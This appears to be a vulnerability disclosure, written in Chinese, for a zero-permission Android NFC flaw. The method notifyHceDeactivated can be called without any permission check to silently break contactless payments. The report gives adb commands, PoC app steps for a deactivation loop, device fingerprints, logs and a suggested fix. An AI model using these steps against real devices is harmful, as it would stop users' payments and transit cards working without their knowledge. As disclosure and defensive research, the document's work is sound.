# NfcService.notifyHceDeactivated — 零权限 NFC 支付拒绝服务

## 漏洞细节

NFC mainline 模块中 `INfcAdapter.Stub.notifyHceDeactivated()` 没有任何权限检查。任何已安装应用都能调用它强制终止正在进行的 HCE 支付会话。

**源码**: `packages/modules/Nfc/src/com/android/nfc/NfcService.java`

```java
@Override
public void notifyHceDeactivated() {
    try {
        mCardEmulationManager.onHostCardEmulationDeactivated(1);
    } catch (Exception ex) {
        Log.e(TAG, "error when notifying HCE deactivated", ex);
    }
    // 无权限检查 — 同类中 enable()、disable()、dispatch() 等全部调用 enforceAdminPermissions()
}
```

调用链到达 `HostEmulationManager.onHostEmulationDeactivated()` → `sendDeactivateToActiveServiceLocked()`，这与手机物理离开 NFC 读卡器时触发的代码路径完全相同，会立即终止活跃的 APDU 会话。

同类中 `notifyPollingLoop()` 也存在相同问题（零权限，transaction code 48）。

## 漏洞影响

**攻击条件**:
- 安装一个恶意应用（可以伪装成任何应用）
- 仅需 `android.permission.NFC` — normal 级别权限，安装时自动授予，无用户提示
- 不需要 root、ADB 或任何特殊权限
- 后台运行即可

**攻击效果**:
- 持续调用 `notifyHceDeactivated()`（约 20 次/秒）
- 所有 NFC 非接触支付失败 — Google Pay、银行 NFC 应用、公交卡
- 用户看不到任何错误。NFC 显示正常开启。无通知、无攻击迹象。
- 唯一修复方式：卸载恶意应用

**影响范围**: 所有使用 NFC 非接触支付或公交卡的 Android 15/16 用户。

## 复现步骤

### 最小化验证（无需安装应用）

```bash
# 确认 NFC 服务可访问：
adb shell service check nfc

# 调用 notifyHceDeactivated（Android 16 上 transaction code 为 49）：
adb shell "service call nfc 49 s16 android.nfc.INfcAdapter"
# 结果: Parcel(00000000) ← 成功，无异常

# 对比 enable()（code 8，有权限检查）：
adb shell "service call nfc 8 s16 android.nfc.INfcAdapter"
# 结果: Parcel(ffffffff ...) ← SecurityException，符合预期

# 验证服务端执行：
adb logcat -d --pid=$(adb shell pidof com.android.nfc) | grep -i deactiv
# 输出:
# NfcHostEmulationManager: onHostEmulationDeactivated
# NfcHostEmulationManager: sendDeactivateToActiveServiceLocked: reason: 0
```

### 完整 PoC 应用

```bash
cd poc-nfc-hijack
# 构建（需要 Android SDK，build-tools，platform 35）：
# 详见 README.md 中的构建说明

adb install build/apk/poc-debug.apk
adb shell am start -n com.poc.nfchijack/.MainActivity
# 点击 "0. Test Binder Access" — 确认获取 binder
# 点击 "V-452: Kill" — 启动 deactivation 循环
# 监控: adb logcat -s NfcKillService
# 预期: "[V-452] HCE deactivation count: 100"（无 SecurityException）
```

### 支付 DoS 验证（需要 NFC 读卡器）

1. 启动 kill 循环（PoC 应用 → "V-452: Kill"）
2. 打开 Google Pay，将手机靠近 NFC 终端
3. 交易失败
4. 停止 kill 循环 → 重试 → 交易成功

## Fingerprint

**已确认存在漏洞**:
```
设备: Pixel 10 (frankel)
系统: Android 16 (SDK 36)
构建: google/frankel/frankel:16/CP1A.260405.005/15001963:user/release-keys
安全补丁: 2026-04-05
NFC 模块: com.android.nfc versionCode:36
```

**受影响版本**: Android 15 (API 35) 和 Android 16 (API 36)。该方法随 PollingLoop API 在 Android 15 中添加。Android 14 可能也受影响（待验证）。

**检测方法**:
```bash
# 如果返回 Parcel(00000000) 而非 SecurityException，则存在漏洞：
adb shell "service call nfc 49 s16 android.nfc.INfcAdapter"
```

注意：transaction code 49 针对当前 AIDL 顺序。其他构建版本需从 `framework-nfc.jar` 提取：
```bash
adb pull /apex/com.android.nfcservices/javalib/framework-nfc.jar /tmp/
dexdump /tmp/framework-nfc.jar | grep -A5 "TRANSACTION_notifyHceDeactivated"
```

## 修复建议

```java
@Override
public void notifyHceDeactivated() {
    NfcPermissions.enforceAdminPermissions(mContext);
    // ... 现有代码
}
```

## 测试证据 (2026-04-30)

```
# 应用层面: 10 秒内 196 次成功调用，0 次失败
NfcKillService: [V-452] Starting HCE deactivation loop (interval=50ms)
NfcKillService: [V-452] HCE deactivation count: 100
NfcKillService: [V-452] Stopped. Total kills=196 failures=0

# 服务端执行证明:
NfcHostEmulationManager: onHostEmulationDeactivated
NfcHostEmulationManager: sendDeactivateToActiveServiceLocked: reason: 0
```
